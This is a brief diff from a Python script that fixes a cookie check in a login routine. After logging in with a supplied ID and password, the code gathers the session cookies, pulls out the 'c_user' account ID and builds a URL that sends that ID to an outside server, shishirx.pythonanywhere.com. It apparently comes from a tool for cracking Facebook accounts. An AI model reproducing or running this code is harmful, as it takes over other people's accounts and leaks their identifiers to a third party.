@@ -1232,7 +1232,7 @@ def m6(idf,pwv):
                              },
                        allow_redirects=False)   
    r_login =session.cookies.get_dict().keys()
-   if 'c_user' in log_cookies:
+   if 'c_user' in r_login:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
